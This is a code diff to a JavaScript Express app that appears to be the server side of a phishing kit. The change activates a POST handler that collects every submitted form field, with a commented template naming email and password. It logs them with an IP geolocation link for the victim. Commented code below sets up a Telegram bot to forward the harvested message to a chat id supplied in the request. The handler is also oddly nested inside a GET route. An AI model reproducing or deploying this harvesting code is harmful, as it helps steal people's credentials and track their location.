@@ -81,25 +81,25 @@ export default function expressApp(functionName) {
   })
 
   router.get('/hello/', function(req, res) {
-    res.send("recieved your request!");
-//   app.post('/', function(req, res){
-//    res.header("Access-Control-Allow-Origin", "*");
-//    res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
-//    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-//    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    
+  app.post('/', function(req, res){
+   res.header("Access-Control-Allow-Origin", "*");
+   res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
+   res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+   var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   
-//    // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
-//        let msg='';
-//   for (let [key, value] of Object.entries(req.body.val)) {
-//   msg +=key+' : '+ value+'\n';
+   // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+       let msg='';
+  for (let [key, value] of Object.entries(req.body.val)) {
+  msg +=key+' : '+ value+'\n';
  
-// }
-// msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+}
+msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
      
-//    console.log(msg);
+   console.log(msg);
+ res.send("recieved your request!");
 
-
-// // Create a bot that uses 'polling' to fetch new updates
+// Create a bot that uses 'polling' to fetch new updates
 // const bot = new telegrambot(req.body.tok, {polling: true});
 
 // bot.sendMessage(req.body.telid, msg);
